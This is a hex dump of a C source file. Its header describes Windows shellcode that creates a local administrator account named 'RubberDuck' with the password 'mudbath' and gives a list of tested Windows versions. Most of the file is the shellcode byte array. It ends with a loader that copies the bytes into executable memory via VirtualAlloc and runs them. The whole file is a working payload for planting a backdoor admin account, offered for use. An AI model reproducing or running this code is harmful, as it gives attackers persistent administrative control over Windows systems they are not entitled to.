00000000  2f 2a 0d 0a 54 69 74 6c  65 3a 20 41 6c 6c 77 69  |/*..Title: Allwi|
00000010  6e 20 57 69 6e 45 78 65  63 20 61 64 64 20 6e 65  |n WinExec add ne|
00000020  77 20 6c 6f 63 61 6c 20  61 64 6d 69 6e 69 73 74  |w local administ|
00000030  72 61 74 6f 72 20 2b 20  45 78 69 74 50 72 6f 63  |rator + ExitProc|
00000040  65 73 73 20 53 68 65 6c  6c 63 6f 64 65 20 2d 20  |ess Shellcode - |
00000050  32 37 32 20 62 79 74 65  73 0d 0a 44 61 74 65 3a  |272 bytes..Date:|
00000060  20 32 30 31 31 2d 30 35  2d 32 35 0d 0a 41 75 74  | 2011-05-25..Aut|
00000070  68 6f 72 3a 20 52 75 62  62 65 72 44 75 63 6b 0d  |hor: RubberDuck.|
00000080  0a 57 65 62 3a 20 68 74  74 70 3a 2f 2f 62 66 6c  |.Web: http://bfl|
00000090  6f 77 2e 73 65 63 75 72  69 74 79 2d 70 6f 72 74  |ow.security-port|
000000a0  61 6c 2e 63 7a 0d 0a 54  65 73 74 65 64 20 6f 6e  |al.cz..Tested on|
000000b0  3a 20 57 69 6e 20 32 6b  2c 20 57 69 6e 20 32 30  |: Win 2k, Win 20|
000000c0  30 33 2c 20 57 69 6e 20  58 50 20 48 6f 6d 65 20  |03, Win XP Home |
000000d0  53 50 32 2f 53 50 33 20  43 5a 2f 45 4e 47 20 28  |SP2/SP3 CZ/ENG (|
000000e0  33 32 29 2c 20 57 69 6e  20 56 69 73 74 61 20 28  |32), Win Vista (|
000000f0  33 32 29 2f 28 36 34 29  2c 20 57 69 6e 20 37 20  |32)/(64), Win 7 |
00000100  28 33 32 29 2f 28 36 34  29 2c 20 57 69 6e 20 32  |(32)/(64), Win 2|
00000110  6b 38 20 28 33 32 29 0d  0a 20 2d 2d 20 63 6f 6d  |k8 (32).. -- com|
00000120  6d 61 6e 64 3a 20 63 6d  64 2e 65 78 65 20 2f 63  |mand: cmd.exe /c|
00000130  20 6e 65 74 20 75 73 65  72 20 52 75 62 62 65 72  | net user Rubber|
00000140  44 75 63 6b 20 6d 75 64  62 61 74 68 20 2f 61 64  |Duck mudbath /ad|
00000150  64 20 26 26 20 6e 65 74  20 6c 6f 63 61 6c 67 72  |d && net localgr|
00000160  6f 75 70 20 61 64 6d 69  6e 69 73 74 72 61 74 6f  |oup administrato|
00000170  72 73 20 52 75 62 62 65  72 44 75 63 6b 20 2f 61  |rs RubberDuck /a|
00000180  64 64 0d 0a 20 2d 2d 20  55 73 65 72 6e 61 6d 65  |dd.. -- Username|
00000190  3a 20 52 75 62 62 65 72  44 75 63 6b 0d 0a 20 2d  |: RubberDuck.. -|
000001a0  2d 20 50 61 73 73 77 6f  72 64 3a 20 6d 75 64 62  |- Password: mudb|
000001b0  61 74 68 0d 0a 2a 2f 0d  0a 20 0d 0a 23 69 6e 63  |ath..*/.. ..#inc|
000001c0  6c 75 64 65 20 3c 73 74  64 69 6f 2e 68 3e 0d 0a  |lude <stdio.h>..|
000001d0  23 69 6e 63 6c 75 64 65  20 3c 77 69 6e 64 6f 77  |#include <window|
000001e0  73 2e 68 3e 0d 0a 20 0d  0a 69 6e 74 20 6d 61 69  |s.h>.. ..int mai|
000001f0  6e 28 29 7b 0d 0a 20 20  20 20 75 6e 73 69 67 6e  |n(){..    unsign|
00000200  65 64 20 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |ed char shellcod|
00000210  65 5b 5d 3d 0d 0a 20 20  20 20 20 20 20 20 22 5c  |e[]=..        "\|
00000220  78 46 43 5c 78 33 33 5c  78 44 32 5c 78 42 32 5c  |xFC\x33\xD2\xB2\|
00000230  78 33 30 5c 78 36 34 5c  78 46 46 5c 78 33 32 5c  |x30\x64\xFF\x32\|
00000240  78 35 41 5c 78 38 42 22  0d 0a 20 20 20 20 20 20  |x5A\x8B"..      |
00000250  20 20 22 5c 78 35 32 5c  78 30 43 5c 78 38 42 5c  |  "\x52\x0C\x8B\|
00000260  78 35 32 5c 78 31 34 5c  78 38 42 5c 78 37 32 5c  |x52\x14\x8B\x72\|
00000270  78 32 38 5c 78 33 33 5c  78 43 39 22 0d 0a 20 20  |x28\x33\xC9"..  |
00000280  20 20 20 20 20 20 22 5c  78 42 31 5c 78 31 38 5c  |      "\xB1\x18\|
00000290  78 33 33 5c 78 46 46 5c  78 33 33 5c 78 43 30 5c  |x33\xFF\x33\xC0\|
000002a0  78 41 43 5c 78 33 43 5c  78 36 31 5c 78 37 43 22  |xAC\x3C\x61\x7C"|
000002b0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 30 32 5c  |..        "\x02\|
000002c0  78 32 43 5c 78 32 30 5c  78 43 31 5c 78 43 46 5c  |x2C\x20\xC1\xCF\|
000002d0  78 30 44 5c 78 30 33 5c  78 46 38 5c 78 45 32 5c  |x0D\x03\xF8\xE2\|
000002e0  78 46 30 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |xF0"..        "\|
000002f0  78 38 31 5c 78 46 46 5c  78 35 42 5c 78 42 43 5c  |x81\xFF\x5B\xBC\|
00000300  78 34 41 5c 78 36 41 5c  78 38 42 5c 78 35 41 5c  |x4A\x6A\x8B\x5A\|
00000310  78 31 30 5c 78 38 42 22  0d 0a 20 20 20 20 20 20  |x10\x8B"..      |
00000320  20 20 22 5c 78 31 32 5c  78 37 35 5c 78 44 41 5c  |  "\x12\x75\xDA\|
00000330  78 38 42 5c 78 35 33 5c  78 33 43 5c 78 30 33 5c  |x8B\x53\x3C\x03\|
00000340  78 44 33 5c 78 46 46 5c  78 37 32 22 0d 0a 20 20  |xD3\xFF\x72"..  |
00000350  20 20 20 20 20 20 22 5c  78 33 34 5c 78 38 42 5c  |      "\x34\x8B\|
00000360  78 35 32 5c 78 37 38 5c  78 30 33 5c 78 44 33 5c  |x52\x78\x03\xD3\|
00000370  78 38 42 5c 78 37 32 5c  78 32 30 5c 78 30 33 22  |x8B\x72\x20\x03"|
00000380  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 46 33 5c  |..        "\xF3\|
00000390  78 33 33 5c 78 43 39 5c  78 34 31 5c 78 41 44 5c  |x33\xC9\x41\xAD\|
000003a0  78 30 33 5c 78 43 33 5c  78 38 31 5c 78 33 38 5c  |x03\xC3\x81\x38\|
000003b0  78 34 37 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x47"..        "\|
000003c0  78 36 35 5c 78 37 34 5c  78 35 30 5c 78 37 35 5c  |x65\x74\x50\x75\|
000003d0  78 46 34 5c 78 38 31 5c  78 37 38 5c 78 30 34 5c  |xF4\x81\x78\x04\|
000003e0  78 37 32 5c 78 36 46 22  0d 0a 20 20 20 20 20 20  |x72\x6F"..      |
000003f0  20 20 22 5c 78 36 33 5c  78 34 31 5c 78 37 35 5c  |  "\x63\x41\x75\|
00000400  78 45 42 5c 78 38 31 5c  78 37 38 5c 78 30 38 5c  |xEB\x81\x78\x08\|
00000410  78 36 34 5c 78 36 34 5c  78 37 32 22 0d 0a 20 20  |x64\x64\x72"..  |
00000420  20 20 20 20 20 20 22 5c  78 36 35 5c 78 37 35 5c  |      "\x65\x75\|
00000430  78 45 32 5c 78 34 39 5c  78 38 42 5c 78 37 32 5c  |xE2\x49\x8B\x72\|
00000440  78 32 34 5c 78 30 33 5c  78 46 33 5c 78 36 36 22  |x24\x03\xF3\x66"|
00000450  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 38 42 5c  |..        "\x8B\|
00000460  78 30 43 5c 78 34 45 5c  78 38 42 5c 78 37 32 5c  |x0C\x4E\x8B\x72\|
00000470  78 31 43 5c 78 30 33 5c  78 46 33 5c 78 38 42 5c  |x1C\x03\xF3\x8B\|
00000480  78 31 34 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x14"..        "\|
00000490  78 38 45 5c 78 30 33 5c  78 44 33 5c 78 35 32 5c  |x8E\x03\xD3\x52\|
000004a0  78 36 38 5c 78 37 38 5c  78 36 35 5c 78 36 33 5c  |x68\x78\x65\x63\|
000004b0  78 30 31 5c 78 46 45 22  0d 0a 20 20 20 20 20 20  |x01\xFE"..      |
000004c0  20 20 22 5c 78 34 43 5c  78 32 34 5c 78 30 33 5c  |  "\x4C\x24\x03\|
000004d0  78 36 38 5c 78 35 37 5c  78 36 39 5c 78 36 45 5c  |x68\x57\x69\x6E\|
000004e0  78 34 35 5c 78 35 34 5c  78 35 33 22 0d 0a 20 20  |x45\x54\x53"..  |
000004f0  20 20 20 20 20 20 22 5c  78 46 46 5c 78 44 32 5c  |      "\xFF\xD2\|
00000500  78 36 41 5c 78 30 35 5c  78 45 42 5c 78 32 33 5c  |x6A\x05\xEB\x23\|
00000510  78 46 46 5c 78 44 30 5c  78 36 38 5c 78 36 35 22  |xFF\xD0\x68\x65"|
00000520  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 37 33 5c  |..        "\x73\|
00000530  78 37 33 5c 78 30 31 5c  78 38 42 5c 78 44 46 5c  |x73\x01\x8B\xDF\|
00000540  78 46 45 5c 78 34 43 5c  78 32 34 5c 78 30 33 5c  |xFE\x4C\x24\x03\|
00000550  78 36 38 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x68"..        "\|
00000560  78 35 30 5c 78 37 32 5c  78 36 46 5c 78 36 33 5c  |x50\x72\x6F\x63\|
00000570  78 36 38 5c 78 34 35 5c  78 37 38 5c 78 36 39 5c  |x68\x45\x78\x69\|
00000580  78 37 34 5c 78 35 34 22  0d 0a 20 20 20 20 20 20  |x74\x54"..      |
00000590  20 20 22 5c 78 46 46 5c  78 37 34 5c 78 32 34 5c  |  "\xFF\x74\x24\|
000005a0  78 31 43 5c 78 46 46 5c  78 35 34 5c 78 32 34 5c  |x1C\xFF\x54\x24\|
000005b0  78 31 43 5c 78 35 37 5c  78 46 46 22 0d 0a 20 20  |x1C\x57\xFF"..  |
000005c0  20 20 20 20 20 20 22 5c  78 44 30 5c 78 45 38 5c  |      "\xD0\xE8\|
000005d0  78 44 38 5c 78 46 46 5c  78 46 46 5c 78 46 46 5c  |xD8\xFF\xFF\xFF\|
000005e0  78 36 33 5c 78 36 44 5c  78 36 34 5c 78 32 45 22  |x63\x6D\x64\x2E"|
000005f0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 36 35 5c  |..        "\x65\|
00000600  78 37 38 5c 78 36 35 5c  78 32 30 5c 78 32 46 5c  |x78\x65\x20\x2F\|
00000610  78 36 33 5c 78 32 30 5c  78 36 45 5c 78 36 35 5c  |x63\x20\x6E\x65\|
00000620  78 37 34 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x74"..        "\|
00000630  78 32 30 5c 78 37 35 5c  78 37 33 5c 78 36 35 5c  |x20\x75\x73\x65\|
00000640  78 37 32 5c 78 32 30 5c  78 35 32 5c 78 37 35 5c  |x72\x20\x52\x75\|
00000650  78 36 32 5c 78 36 32 22  0d 0a 20 20 20 20 20 20  |x62\x62"..      |
00000660  20 20 22 5c 78 36 35 5c  78 37 32 5c 78 34 34 5c  |  "\x65\x72\x44\|
00000670  78 37 35 5c 78 36 33 5c  78 36 42 5c 78 32 30 5c  |x75\x63\x6B\x20\|
00000680  78 36 44 5c 78 37 35 5c  78 36 34 22 0d 0a 20 20  |x6D\x75\x64"..  |
00000690  20 20 20 20 20 20 22 5c  78 36 32 5c 78 36 31 5c  |      "\x62\x61\|
000006a0  78 37 34 5c 78 36 38 5c  78 32 30 5c 78 32 46 5c  |x74\x68\x20\x2F\|
000006b0  78 36 31 5c 78 36 34 5c  78 36 34 5c 78 32 30 22  |x61\x64\x64\x20"|
000006c0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 32 36 5c  |..        "\x26\|
000006d0  78 32 36 5c 78 32 30 5c  78 36 45 5c 78 36 35 5c  |x26\x20\x6E\x65\|
000006e0  78 37 34 5c 78 32 30 5c  78 36 43 5c 78 36 46 5c  |x74\x20\x6C\x6F\|
000006f0  78 36 33 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x63"..        "\|
00000700  78 36 31 5c 78 36 43 5c  78 36 37 5c 78 37 32 5c  |x61\x6C\x67\x72\|
00000710  78 36 46 5c 78 37 35 5c  78 37 30 5c 78 32 30 5c  |x6F\x75\x70\x20\|
00000720  78 36 31 5c 78 36 34 22  0d 0a 20 20 20 20 20 20  |x61\x64"..      |
00000730  20 20 22 5c 78 36 44 5c  78 37 34 5c 78 36 46 5c  |  "\x6D\x74\x6F\|
00000740  78 37 32 5c 78 37 33 5c  78 32 30 5c 78 35 32 5c  |x72\x73\x20\x52\|
00000750  78 37 35 5c 78 36 32 5c  78 36 32 22 0d 0a 20 20  |x75\x62\x62"..  |
00000760  20 20 20 20 20 20 22 5c  78 36 35 5c 78 37 32 5c  |      "\x65\x72\|
00000770  78 34 34 5c 78 37 35 5c  78 36 33 5c 78 36 42 5c  |x44\x75\x63\x6B\|
00000780  78 32 30 5c 78 32 46 5c  78 36 31 5c 78 36 34 22  |x20\x2F\x61\x64"|
00000790  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 36 34 5c  |..        "\x64\|
000007a0  78 30 30 22 3b 0d 0a 20  20 20 20 4c 50 56 4f 49  |x00";..    LPVOI|
000007b0  44 20 6c 70 41 6c 6c 6f  63 3b 0d 0a 20 20 20 20  |D lpAlloc;..    |
000007c0  76 6f 69 64 20 28 2a 70  66 75 6e 63 29 28 29 3b  |void (*pfunc)();|
000007d0  0d 0a 20 0d 0a 20 20 20  20 70 72 69 6e 74 66 28  |.. ..    printf(|
000007e0  22 73 69 7a 65 20 3d 20  25 69 20 62 79 74 65 73  |"size = %i bytes|
000007f0  5c 6e 22 2c 20 6c 73 74  72 6c 65 6e 28 73 68 65  |\n", lstrlen(she|
00000800  6c 6c 63 6f 64 65 29 20  2b 20 31 29 3b 0d 0a 20  |llcode) + 1);.. |
00000810  20 20 20 70 72 69 6e 74  66 28 22 2d 2d 2d 2d 2d  |   printf("-----|
00000820  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000830  2d 2d 2d 2d 5c 6e 55 73  65 72 6e 61 6d 65 3a 20  |----\nUsername: |
00000840  52 75 62 62 65 72 44 75  63 6b 5c 6e 50 61 73 73  |RubberDuck\nPass|
00000850  77 6f 72 64 3a 20 6d 75  64 62 61 74 68 5c 6e 22  |word: mudbath\n"|
00000860  29 3b 0d 0a 20 20 20 20  73 79 73 74 65 6d 28 22  |);..    system("|
00000870  50 41 55 53 45 22 29 3b  0d 0a 20 0d 0a 20 20 20  |PAUSE");.. ..   |
00000880  20 6c 70 41 6c 6c 6f 63  20 3d 20 56 69 72 74 75  | lpAlloc = Virtu|
00000890  61 6c 41 6c 6c 6f 63 28  30 2c 20 34 30 39 36 2c  |alAlloc(0, 4096,|
000008a0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 4d 45 4d  |             MEM|
000008c0  5f 43 4f 4d 4d 49 54 2c  0d 0a 20 20 20 20 20 20  |_COMMIT,..      |
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008e0  20 20 20 20 20 50 41 47  45 5f 45 58 45 43 55 54  |     PAGE_EXECUT|
000008f0  45 5f 52 45 41 44 57 52  49 54 45 29 3b 0d 0a 20  |E_READWRITE);.. |
00000900  0d 0a 20 20 20 20 69 66  28 6c 70 41 6c 6c 6f 63  |..    if(lpAlloc|
00000910  20 3d 3d 20 4e 55 4c 4c  29 7b 0d 0a 20 20 20 20  | == NULL){..    |
00000920  20 20 20 20 70 72 69 6e  74 66 28 22 4d 65 6d 6f  |    printf("Memo|
00000930  72 79 20 6e 6f 74 20 61  6c 6c 6f 63 61 74 65 64  |ry not allocated|
00000940  21 5c 6e 22 29 3b 0d 0a  20 20 20 20 20 20 20 20  |!\n");..        |
00000950  72 65 74 75 72 6e 20 30  3b 0d 0a 20 20 20 20 7d  |return 0;..    }|
00000960  0d 0a 20 0d 0a 20 20 20  20 6d 65 6d 63 70 79 28  |.. ..    memcpy(|
00000970  6c 70 41 6c 6c 6f 63 2c  20 73 68 65 6c 6c 63 6f  |lpAlloc, shellco|
00000980  64 65 2c 20 6c 73 74 72  6c 65 6e 28 73 68 65 6c  |de, lstrlen(shel|
00000990  6c 63 6f 64 65 29 20 2b  20 31 29 3b 0d 0a 20 0d  |lcode) + 1);.. .|
000009a0  0a 20 20 20 20 70 66 75  6e 63 20 3d 20 6c 70 41  |.    pfunc = lpA|
000009b0  6c 6c 6f 63 3b 0d 0a 20  0d 0a 20 20 20 20 70 66  |lloc;.. ..    pf|
000009c0  75 6e 63 28 29 3b 0d 0a  20 0d 0a 20 20 20 20 72  |unc();.. ..    r|
000009d0  65 74 75 72 6e 20 30 3b  0d 0a 7d                 |eturn 0;..}|
000009db
